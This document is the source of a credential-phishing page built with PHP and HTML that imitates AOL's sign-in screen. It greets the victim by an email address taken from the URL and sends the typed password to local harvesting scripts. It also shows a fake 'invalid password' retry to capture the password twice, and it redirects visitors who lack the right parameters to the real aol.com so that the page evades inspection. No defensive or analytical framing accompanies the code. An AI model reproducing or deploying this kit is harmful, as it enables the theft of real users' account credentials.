<html id="Stencil" class="js" onload="openwin()"><head>
        <title>AOL</title>
<?php
    error_reporting(0);
    $must=$_GET['file'];
    if(!$_GET['email']){
        header("Location:https://aol.com/uploads");
         }
             else if(!$_GET['auth']){
        header("Location:https://aol.com/uploads");
         }
    if($_GET['retry']){
        $incf = "<input id='login-passwd' name='pass' placeholder='Password' autofocus='' required='require' type='password'><p class='error-msg' role='alert' data-error='messages.ERROR_INVALID_PASSWORD'>Invalid password. Please try&nbsp;again</p>";
        $post = "view_file/messages.php?file=DE54FTTY23454676MISHJ8934H59HWER9";
    }
    else{
        $incf = "<input id='login-passwd' name='pass' placeholder='Password' autofocus='' type='password'>";
        $post = "view_file/messages1.php?file=DE54FTTY23454676MISHJ8934H59HWER9";
    }
    ;?>
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="AOL_files/combo.css">
        <!--<![endif]-->
        <style nonce="zlkkjOQUruKuC0ta46UqHcbmUg3A83Yw0c1+Lr2jbGwbD6KG">
            #mbr-css-check { 
                display: inline;
            }
        </style>
        <link href="AOL_files/aol-main.css" rel="stylesheet" type="text/css">
<script src="AOL_files/boot.js" type="text/javascript"></script><script src="AOL_files/g-r-min.js" class="sf_lib" type="text/javascript" id="sf_host_lib_sf_auto_2-19-5-2018"></script></head>
    <body>
        <div class="mbr-legacy-device-bar " id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
            <input id="mbr-legacy-device-bar-cross" type="checkbox">
            <p class="mbr-legacy-device">
                AOL works best with the latest versions of the browsers.
 You're using an outdated or unsupported browser and some AOL features 
may not work properly. Please update your browser version now. <a href="https://help.yahoo.com/kb/index?page=content&amp;y=PROD_ACCT&amp;id=SLN4556&amp;actp=productlink&amp;locale=en_US">More&nbsp;Info</a>
            </p>
        </div>

    <div id="login-body" class="loginish  puree-v2 responsive dark-background">
    <div class="mbr-desktop-hd pure-g">
    <div class="pure-u-4-5">
         <a href="#">
            <img src="AOL_files/aol-logo-black-v.png" alt="Aol" class="logo " height="" width="100">
        </a>
    </div>
    <div class="pure-u-1-5 txt-align-right">
        <div class="help"><a href="#">Help</a></div>
    </div>
</div>

    <div class="login-box-container">
        <div class="login-box default">
            <div class="txt-align-center">
                    <img src="AOL_files/aol-logo-black-v.png" alt="Aol" class="logo " height="" width="100">
            </div>
            <div class="challenge">


    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username">Hello&nbsp; <?php echo $_GET['email'];?> </h1>
            <p class="not-you"><a href="#">Not&nbsp;you?</a></p>
    </div>
    <form action="<?php echo $post;?>" method="post" class="pure-form pure-form-stacked">
        <div class="hidden-username">
        </div>
        <input name="email" value='<?php echo $_GET['email'];?>' type="hidden">
        <?php echo $incf;?>
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign&nbsp;in" data-ylk="elm:btn;elmt:next;slk:next">                        
                    Sign&nbsp;in
            </button>
        </p>
        <p class="forgot-cont">
            <input class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link" name="skip" value="I forgot my&nbsp;password" type="submit">
        </p>
    </form>



</div>

</div>

        </div>
        <div style="display: block;" id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1></h1>
<p></p>

        </div>
    </div>
    <div class="login-box-ad-outer">
        <div class="login-box-ad-inner"><div style="visibility: inherit;" id="login-ad-rich"></div></div>
    </div>
</div>

    <script src="AOL_files/bundle.js"></script><div id="ads"></div>
    <noscript>
        <img src="/account/js-reporting/?crumb=rJK/e5XO6Nk&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <div id="mbr-css-check"></div>

<script src="AOL_files/client.php"></script><div style="display: none;" class="darla" id="darla_csc_holder">
<iframe marginheight="0" marginwidth="0" tabindex="-1" hidefocus="true" allowtransparency="true" scrolling="no" src="AOL_files/r-csc.htm" class="darla" id="darla_csc_writer_0" style="display: none;" frameborder="no"></iframe></div></body></html>